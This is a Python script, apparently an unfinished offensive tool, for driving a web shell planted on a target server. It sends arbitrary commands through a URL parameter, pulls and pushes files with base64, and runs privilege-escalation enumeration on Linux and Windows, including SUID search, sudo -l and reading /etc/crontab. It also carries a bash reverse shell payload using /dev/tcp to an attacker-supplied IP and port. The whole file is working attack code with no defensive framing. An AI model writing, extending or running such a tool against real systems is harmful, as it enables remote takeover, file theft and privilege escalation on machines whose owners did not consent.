#!/usr/bin/env python3
# webshell_handler.py
# IN PROGRESS

import requests
import sys
import base64
import os
import re
import readline
import atexit

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <webshell_url> <param>")
    sys.exit(1)

URL = sys.argv[1]
PARAM = sys.argv[2]

session = requests.Session()

HISTORY_FILE = ".webshell_history"

# load history
if os.path.exists(HISTORY_FILE):
    readline.read_history_file(HISTORY_FILE)

atexit.register(readline.write_history_file, HISTORY_FILE)

COMMANDS = [
    "help",
    "exit",
    "detect",
    "enum",
    "download",
    "upload",
    "rev"
]

def completer(text, state):

    options = [cmd for cmd in COMMANDS if cmd.startswith(text)]

    if state < len(options):
        return options[state] + " "
    return None

readline.parse_and_bind("tab: complete")
readline.set_completer(completer)


def strip_html(text):
    return re.sub("<.*?>", "", text)


def run(cmd):
    r = session.get(URL, params={PARAM: cmd}, timeout=20)
    return strip_html(r.text).strip()


def detect_os():

    print("[*] Detecting OS")

    data = run("uname -a")

    if data:
        print("[+] Linux detected")
        print(data)
        return "linux"

    data = run("ver")

    if data:
        print("[+] Windows detected")
        print(data)
        return "windows"

    return "unknown"


def download(remote):

    print(f"[*] Downloading {remote}")

    data = run(f"base64 {remote}")

    try:
        decoded = base64.b64decode(data)
        filename = os.path.basename(remote)

        with open(filename, "wb") as f:
            f.write(decoded)

        print(f"[+] Saved {filename}")

    except:
        print("[-] Download failed")


def upload(local, remote):

    if not os.path.exists(local):
        print("[-] File not found")
        return

    print(f"[*] Uploading {local}")

    with open(local, "rb") as f:
        b64 = base64.b64encode(f.read()).decode()

    run(f"echo {b64} | base64 -d > {remote}")

    print("[+] Upload finished")


def reverse_shell(ip, port):

    print("[*] Triggering reverse shell")

    payload = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    run(payload)


def priv_enum_linux():

    print("\n[+] Linux PrivEsc Enumeration\n")

    checks = {
        "User": "whoami",
        "ID": "id",
        "Kernel": "uname -a",
        "Sudo": "sudo -l",
        "SUID": "find / -perm -4000 2>/dev/null",
        "Writable dirs": "find / -writable -type d 2>/dev/null | head",
        "Cron": "cat /etc/crontab 2>/dev/null",
        "Processes": "ps aux | head"
    }

    for name, cmd in checks.items():

        print(f"\n--- {name} ---")
        print(run(cmd))


def priv_enum_windows():

    print("\n[+] Windows PrivEsc Enumeration\n")

    checks = {
        "User": "whoami",
        "System": "systeminfo",
        "Privileges": "whoami /priv",
        "Groups": "whoami /groups",
        "Processes": "tasklist"
    }

    for name, cmd in checks.items():

        print(f"\n--- {name} ---")
        print(run(cmd))


def help_menu():

    print("""
Commands

help                     show help
exit                     exit

detect                   detect OS
enum                     privilege escalation enumeration

download <remote>        download file
upload <local> <remote>  upload file
rev <ip> <port>          reverse shell

Any other command executes on the target
""")


print("\n[+] Webshell Handler Started\n")
print("Target:", URL)
print("Parameter:", PARAM)
print("History enabled")
print("Tab completion enabled")
print("Type help\n")

os_type = None

while True:

    try:

        cmd = input("webshell> ").strip()

        if cmd == "":
            continue

        if cmd == "exit":
            break

        if cmd == "help":
            help_menu()
            continue

        if cmd == "detect":
            os_type = detect_os()
            continue

        if cmd == "enum":

            if not os_type:
                os_type = detect_os()

            if os_type == "linux":
                priv_enum_linux()
            elif os_type == "windows":
                priv_enum_windows()

            continue

        if cmd.startswith("download "):
            download(cmd.split(" ",1)[1])
            continue

        if cmd.startswith("upload "):

            parts = cmd.split()

            if len(parts) != 3:
                print("usage: upload <local> <remote>")
                continue

            upload(parts[1], parts[2])
            continue

        if cmd.startswith("rev "):

            parts = cmd.split()

            if len(parts) != 3:
                print("usage: rev <ip> <port>")
                continue

            reverse_shell(parts[1], parts[2])
            continue

        print(run(cmd))

    except KeyboardInterrupt:
        print()
        break

    except Exception as e:
        print("[!] error:", e)
